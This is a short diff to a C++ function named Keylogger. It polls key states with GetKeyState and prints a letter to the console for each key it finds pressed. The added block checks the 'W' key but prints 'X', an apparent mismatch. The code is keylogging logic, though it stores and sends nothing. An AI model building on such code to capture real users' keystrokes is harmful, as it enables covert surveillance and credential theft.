@@ -122,6 +122,10 @@ void Keylogger(int delai) {
 			cout << "V";
 			this_thread::sleep_for(chrono::milliseconds(delai));
 		}
+		if (GetKeyState('W') & 0x8000) {
+			cout << "X";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
 		if (GetKeyState('X') & 0x8000) {
 
 			cout << "X";
